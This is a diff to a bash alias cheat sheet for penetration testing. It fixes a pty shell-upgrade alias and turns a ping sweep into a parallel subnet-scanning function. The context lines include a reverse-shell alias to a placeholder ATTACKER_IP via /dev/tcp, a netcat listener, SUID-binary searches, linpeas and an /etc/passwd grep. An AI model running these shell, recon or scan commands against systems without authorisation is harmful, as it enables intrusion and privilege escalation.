@@ -88,7 +88,7 @@ alias pwncat='rlwrap nc -lvnp'
 alias revip='ip a | grep -E "inet\s"'
 alias revsh='bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
 alias shellz='python3 -c "import pty; pty.spawn(\'/bin/bash\')"'
-alias upgrade='python3 -c "import pty; pty.spawn(\'/bin/bash\'); import os; os.system(\'export TERM=xterm\')"'
+alias upgrade='python3 -c "import pty; pty.spawn(\"/bin/bash\")"' # After running, manually type: export TERM=xterm
 alias suidbin='find / -perm -4000 -type f 2>/dev/null'
 alias linpeas='./linpeas.sh | tee linpeas.log'
 ```
@@ -99,7 +99,7 @@ alias linpeas='./linpeas.sh | tee linpeas.log'
 
 ```bash
 alias checkperm='find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null'
-alias pshell='python3 -c "import pty;pty.spawn(\'/bin/bash\')"'
+alias pshell='python3 -c "import pty; pty.spawn(\'/bin/bash\')"'
 alias suidlist='find / -type f -perm -04000 -ls 2>/dev/null'
 alias gtfo='xdg-open https://gtfobins.github.io'
 alias sudoers='sudo -l'
@@ -114,7 +114,13 @@ alias chkpasswd='cat /etc/passwd | grep sh$'
 ```bash
 alias myports='ss -tulwn'
 alias sniff='sudo tcpdump -i any -nn'
-alias scanlive='for ip in $(seq 1 254); do ping -c1 192.168.1.$ip | grep "64 bytes"; done'
+scanlive() {
+  local subnet=${1:-192.168.1}
+  for ip in $(seq 1 254); do
+    ping -c1 "${subnet}.${ip}" | grep "64 bytes" &
+  done
+  wait
+}
 alias dnslookup='dig +short'
 alias whoisall='whois $(whoami)@$(hostname)'
 ```
